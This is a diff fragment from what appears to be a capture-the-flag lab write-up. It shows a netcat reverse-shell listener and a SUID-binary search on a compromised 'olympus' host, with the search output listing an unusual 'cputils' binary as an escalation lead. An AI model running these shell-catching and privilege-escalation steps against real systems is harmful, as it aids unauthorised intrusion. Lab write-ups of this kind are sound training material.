@@ -177,3 +177,24 @@ nc -lvnp 9001
 www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ 
 ```
 
+```bash
+www-data@olympus:/var/www/html/chat.olympus.thm$ find / -type f -perm -4000 2>/dev/null | grep -v /snap*
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/cputils
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/newgrp
+
+```
